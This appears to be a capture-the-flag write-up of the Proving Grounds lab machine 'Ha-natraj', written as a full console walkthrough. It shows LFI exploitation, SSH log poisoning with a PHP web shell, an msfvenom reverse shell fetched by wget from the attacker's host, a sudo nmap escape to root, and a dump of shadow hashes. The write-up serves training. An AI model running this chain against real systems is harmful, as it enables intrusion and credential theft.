
# Recon

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# nmap -Pn -sT -sV 192.168.90.80  -p- --min-rate 1000 --max-retries 2 --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2021-12-02 23:00 CST
Warning: 192.168.90.80 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.90.80
Host is up, received user-set (0.10s latency).
Not shown: 63634 closed ports, 1899 filtered ports
Reason: 63634 conn-refused and 1899 no-responses
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.99 seconds
``` 

## HTTP TCP/80

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Ha-natraj/img/1.png)

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# nmap -Pn -sT -sV --script http-enum 192.168.148.80 -p 80 --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2021-12-02 23:21 CST
Nmap scan report for 192.168.148.80
Host is up, received user-set (0.11s latency).

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-enum: 
|   /console/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.66 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# python3 /opt/dirsearch/dirsearch.py -u http://192.168.148.80/ -e php,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 6432

Error Log: /opt/dirsearch/logs/errors-21-12-02_23-18-06.log

Target: http://192.168.148.80/

[23:18:06] Starting: 
[23:18:38] 301 -  318B  - /console  ->  http://192.168.148.80/console/
[23:18:38] 200 -  942B  - /console/
[23:18:48] 301 -  317B  - /images  ->  http://192.168.148.80/images/
[23:18:49] 200 -   14KB - /index.html

Task Completed
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Ha-natraj/img/2.png)

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash
```

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# cewl http://192.168.148.80 -m 5 -w words.txt
CeWL 5.4.3 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
root@kali:/OSCPv3/offsec_pg/Ha-natraj# head words.txt 
dance
Nataraja
Shiva
which
Section
Hindu
Tamil
right
meaning
Sanskrit
```

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# hydra -l natraj -P words.txt 192.168.148.80 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-02 23:15:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 421 login tries (l:1/p:0), ~421 tries per task
[DATA] attacking ssh://192.168.148.80:22/
[STATUS] 260.00 tries/min, 260 tries in 00:00h, 0 to do in 01:00h, 165 active
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-12-02 23:17:31
```

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# hydra -l mahakal -P words.txt 192.168.148.80 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-02 23:26:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 421 login tries (l:1/p:0), ~421 tries per task
[DATA] attacking ssh://192.168.148.80:22/
[STATUS] 258.00 tries/min, 258 tries in 00:00h, 0 to do in 01:00h, 165 active
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2021-12-02 23:28:17
```

# Explotation

https://www.hackingarticles.in/apache-log-poisoning-through-lfi/

https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html

```console
etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
```

```console
Logs Apache
/var/log/apache2/error.log
/var/log/apache2/access.log
other_vhosts_access.log
```

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/etc/httpd/logs/acces_log
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/etc/httpd/logs/error_log
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/var/www/logs/access_log
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/var/www/logs/access.log
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/usr/local/apache/logs/access_log
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/usr/local/apache/logs/access.log
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/var/log/apache/access_log
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/var/log/apache2/access_log
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/var/log/apache/access.log
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/var/log/apache2/access.log
root@kali:/OSCPv3/offsec_pg/Ha-natraj# curl http://192.168.148.80/console/file.php?file=/var/log/access_log
root@kali:/OSCPv3/offsec_pg/Ha-natraj# 
```

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# wfuzz -c -t 500 --hc=404 --hl=0 -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt http://192.168.148.80/console/file.php?file=FUZZ 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.148.80/console/file.php?file=FUZZ
Total requests: 257

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200     27 L	      35 W	   1398 Ch	  "/etc/passwd"
000005:  C=200    227 L	    1115 W	   7224 Ch	  "/etc/apache2/apache2.conf"
000015:  C=200     15 L	     124 W	    722 Ch	  "/etc/crontab"
000018:  C=200     11 L	      81 W	    625 Ch	  "/etc/fstab"
000024:  C=200      7 L	      22 W	    186 Ch	  "/etc/hosts"
000111:  C=200      9 L	     302 W	    757 Ch	  "/proc/stat"
000112:  C=200      2 L	      10 W	     95 Ch	  "/proc/swaps"
000113:  C=200      1 L	      17 W	    146 Ch	  "/proc/version"
000114:  C=200      2 L	      15 W	    158 Ch	  "/proc/self/net/arp"
000025:  C=200     10 L	      57 W	    411 Ch	  "/etc/hosts.allow"
000026:  C=200     17 L	     111 W	    711 Ch	  "/etc/hosts.deny"
000038:  C=200      2 L	       5 W	     24 Ch	  "/etc/issue"
000044:  C=200      4 L	       6 W	    103 Ch	  "/etc/lsb-release"
000048:  C=200     33 L	     198 W	   2447 Ch	  "/etc/mtab"
000052:  C=200      8 L	      39 W	    247 Ch	  "/etc/network/interfaces"
000053:  C=200      2 L	      12 W	     91 Ch	  "/etc/networks"
000055:  C=200     27 L	      35 W	   1398 Ch	  "/etc/passwd"
000220:  C=200      2 L	       9 W	   4992 Ch	  "/var/log/wtmp"
000224:  C=200      1 L	       2 W	   1152 Ch	  "/var/run/utmp"
000070:  C=200     27 L	      97 W	    581 Ch	  "/etc/profile"
000080:  C=200     17 L	     111 W	    701 Ch	  "/etc/resolv.conf"
000083:  C=200     51 L	     218 W	   1580 Ch	  "/etc/ssh/ssh_config"
000084:  C=200    122 L	     396 W	   3264 Ch	  "/etc/ssh/sshd_config"
000104:  C=200     28 L	     186 W	   1073 Ch	  "/proc/cpuinfo"
000105:  C=200     32 L	      58 W	    383 Ch	  "/proc/filesystems"
000106:  C=200     68 L	     393 W	   3513 Ch	  "/proc/interrupts"
000107:  C=200     61 L	     225 W	   1622 Ch	  "/proc/ioports"
000108:  C=200     48 L	     140 W	   1335 Ch	  "/proc/meminfo"
000109:  C=200     41 L	     246 W	   2119 Ch	  "/proc/modules"
000110:  C=200     33 L	     198 W	   2447 Ch	  "/proc/mounts"
000173:  C=200   16908 L	   249898 W	  1916914 Ch	  "/var/log/auth.log"

Total time: 7.166501
Processed Requests: 257
Filtered Requests: 226
Requests/sec.: 35.86128
```

### review other injection

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# ssh \<?php\ passthru\(\$_GET[\'cmd\']\)\;\ ?\>@192.168.230.80
<?php passthru($_GET['cmd']); @192.168.230.80's password: 
Permission denied, please try again.
<?php passthru($_GET['cmd']); @192.168.230.80's password: 
Permission denied, please try again.
<?php passthru($_GET['cmd']); @192.168.230.80's password: 
<?php passthru($_GET['cmd']); ?>@192.168.230.80: Permission denied (publickey,password).
```

```console
http://192.168.230.80/console/file.php?file=/var/log/auth.log&cmd=whoami
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Ha-natraj/img/5.png)

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.230 LPORT=80 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

```console
http://192.168.230.80/console/file.php?file=/var/log/auth.log&cmd=wget%20http://192.168.49.230/shell.elf
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Ha-natraj/img/6.png)

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.230.80 - - [03/Dec/2021 00:38:27] "GET /shell.elf HTTP/1.1" 200 -
192.168.230.80 - - [03/Dec/2021 00:38:27] "GET /shell.elf HTTP/1.1" 200 -
192.168.230.80 - - [03/Dec/2021 00:38:27] "GET /shell.elf HTTP/1.1" 200 -
192.168.230.80 - - [03/Dec/2021 00:38:28] "GET /shell.elf HTTP/1.1" 200 -
192.168.230.80 - - [03/Dec/2021 00:38:28] "GET /shell.elf HTTP/1.1" 200 -
```

```console
http://192.168.230.80/console/file.php?file=/var/log/auth.log&cmd=chmod%20%2bx%20shell.elf
```
![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Ha-natraj/img/7.png)


```console
http://192.168.230.80/console/file.php?file=/var/log/auth.log&cmd=./shell.elf
```
![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Ha-natraj/img/8.png)

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.230] from (UNKNOWN) [192.168.230.80] 43446
whoami
www-data
script /dev/null -c bash
Script started, file is /dev/null
www-data@ubuntu:/var/www/html/console$ ^Z
[1]+  Detenido                nc -lvnp 80
root@kali:/OSCPv3/offsec_pg/Ha-natraj# stty raw -echo
root@kali:/OSCPv3/offsec_pg/Ha-natraj# nc -lvnp 80
                                                  reset
reset: unknown terminal type unknown
Terminal type? xterm

www-data@ubuntu:/var/www/html/console$ export TERM=xterm
www-data@ubuntu:/var/www/html/console$ export SHELL=bash
www-data@ubuntu:/var/www/html/console$ stty rows 36 columns 144 
```

```console
www-data@ubuntu:/var/www/html/console$ ls
file.php  shell.elf  shell.elf.1  shell.elf.2  shell.elf.3  shell.elf.4
```

```console
www-data@ubuntu:/var/www/html$ ls
console  font.css  images  index.html  style.css
```
```console
www-data@ubuntu:/var/www$ cat local.txt 
1e611f8c40cf00f70b60f43a0cb73667
``` 

# Privilege escalationRecon

```console
www-data@ubuntu:/home/natraj$ ls -la
total 32
drwxr-xr-x 4 natraj natraj 4096 Jun  3  2020 .
drwxr-xr-x 4 root   root   4096 Jun  3  2020 ..
-rw------- 1 root   root      0 Aug  7  2020 .bash_history
-rw-r--r-- 1 natraj natraj  220 Jun  3  2020 .bash_logout
-rw-r--r-- 1 natraj natraj 3771 Jun  3  2020 .bashrc
drwx------ 2 natraj natraj 4096 Jun  3  2020 .cache
drwx------ 3 natraj natraj 4096 Jun  3  2020 .gnupg
-rw-r--r-- 1 natraj natraj  807 Jun  3  2020 .profile
-rw-r--r-- 1 root   root     66 Jun  3  2020 .selected_editor
-rw-r--r-- 1 natraj natraj    0 Jun  3  2020 .sudo_as_admin_successful
www-data@ubuntu:/home/natraj$ cat .sudo_as_admin_successful 
```    

```console
www-data@ubuntu:/home/mahakal$ ls -la
total 32
drwxr-xr-x 4 mahakal mahakal 4096 Aug  7  2020 .
drwxr-xr-x 4 root    root    4096 Jun  3  2020 ..
-rw------- 1 mahakal mahakal   15 Aug 22  2020 .bash_history
-rw-r--r-- 1 mahakal mahakal  220 Jun  3  2020 .bash_logout
-rw-r--r-- 1 mahakal mahakal 3771 Jun  3  2020 .bashrc
drwx------ 2 mahakal mahakal 4096 Aug  7  2020 .cache
drwx------ 3 mahakal mahakal 4096 Aug  7  2020 .gnupg
-rw-r--r-- 1 mahakal mahakal  807 Jun  3  2020 .profile
www-data@ubuntu:/home/mahakal$ cat .bash_history 
cat: .bash_history: Permission denied
www-data@ubuntu:/home/mahakal$ cd .cache/       
bash: cd: .cache/: Permission denied
```

```console
www-data@ubuntu:/home/mahakal$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/systemctl start apache2
    (ALL) NOPASSWD: /bin/systemctl stop apache2
    (ALL) NOPASSWD: /bin/systemctl restart apache2
``` 

```console
www-data@ubuntu:/home/mahakal$ cat /etc/apache2/apache2.conf | grep root
User root
# not allow access to the root filesystem outside of /usr/share and /var/www.
...
...
```

```console
www-data@ubuntu:/home$ cat /etc/apache2/apache2.conf | grep mahakal
User mahakal
Group mahakal
...
...
```

```console
www-data@ubuntu:/tmp$ sudo /bin/systemctl restart apache2

Session terminated.
                   Terminated
www-data@ubuntu:/tmp$ 
                      Session terminated.
                                         exit
```

```console
root@kali:/OSCPv3/offsec_pg/Ha-natraj# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.230] from (UNKNOWN) [192.168.230.80] 45120
Linux ubuntu 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 23:40:06 up 27 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(mahakal) gid=1001(mahakal) groups=1001(mahakal)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
mahakal
$ script /dev/null -c bash
Script started, file is /dev/null
mahakal@ubuntu:/$ ^Z
[1]+  Detenido                nc -lvnp 80
root@kali:/OSCPv3/offsec_pg/Ha-natraj# stty raw -echo
root@kali:/OSCPv3/offsec_pg/Ha-natraj# nc -lvnp 80
                                                  reset
reset: unknown terminal type unknown
Terminal type? xterm

mahakal@ubuntu:/$ export TERm=xterm-256color     
mahakal@ubuntu:/$ export SHELL=bash
mahakal@ubuntu:/$ stty rows 36 columns 144  
mahakal@ubuntu:/$
```

```console
mahakal@ubuntu:/$ sudo -l
Matching Defaults entries for mahakal on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mahakal may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/nmap
mahakal@ubuntu:/$
```

```console
mahakal@ubuntu:/$ TF=$(mktemp)
mahakal@ubuntu:/$ echo 'os.execute("/bin/sh")' > $TF
mahakal@ubuntu:/$ sudo nmap --script=$TF

Starting Nmap 7.60 ( https://nmap.org ) at 2021-12-02 23:44 PST
NSE: Warning: Loading '/tmp/tmp.H8g1Unm7wB' -- the recommended file extension is '.nse'.
# /bin/sh: 1: whowhowwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwhoami: not found
# root
# fcff3f58b33bc55f08f54af4cc844383
# 
```

```console
root@ubuntu:~# ls -la
total 36
drwx------  5 root root 4096 Dec  2 23:15 .
drwxr-xr-x 22 root root 4096 Jul  2  2020 ..
-rw-------  1 root root    0 Sep  2  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Jul  2  2020 .cache
drwx------  3 root root 4096 Jul  2  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun  3  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Dec  2 23:15 proof.txt
-rw-r--r--  1 root root   32 Aug 18  2020 root.txt
root@ubuntu:~# cat proof.txt 
fcff3f58b33bc55f08f54af4cc844383
```

```console
root@ubuntu:/# cat .bash_history
mount -n -o remount,rw /
passwd root
exec /sbin/init 
root@ubuntu:/# cat /etc/shadow
root:$6$G.94pnLS$D27Iy6b.BROlmd6GEwc40saXDBfi0n.ip/.sVXJvESV8Yvhfv2EOzYyxpLia64aZkjW/gfI6iD.tNqeN2mA/C.:18445:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
uuidd:*:18416:0:99999:7:::
natraj:$6$.XodHndc$.SOi8b139xN..aav96Yu5iEb3R.ilcgxEfZrMh7f4c4Xki7R6yCQJp5drmwVS3qHZf2yz9lDkSlMslP0X5Efs0:18445:0:99999:7:::
sshd:*:18416:0:99999:7:::
mahakal:$6$mIBwJYQr$ptq3ijnX.wf5CQ8zVCnxx91t8J.lFcawMnzs34V3aVL5yv2nXKnVR1eSOudW3dAvjv4qExqnwGDVOrmK6Mise1:18445:0:99999:7:::
``` 




